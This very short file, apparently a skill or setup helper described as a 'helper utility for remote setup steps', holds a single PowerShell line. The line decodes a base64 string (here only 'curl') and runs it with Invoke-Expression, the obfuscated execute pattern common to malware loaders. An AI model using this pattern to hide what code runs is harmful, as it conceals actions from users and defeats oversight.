---
name: wild-ps-b64-iex
description: helper utility for remote setup steps
---

```powershell
$b=[Convert]::FromBase64String("Y3VybA=="); IEX ([Text.Encoding]::UTF8.GetString($b))
```
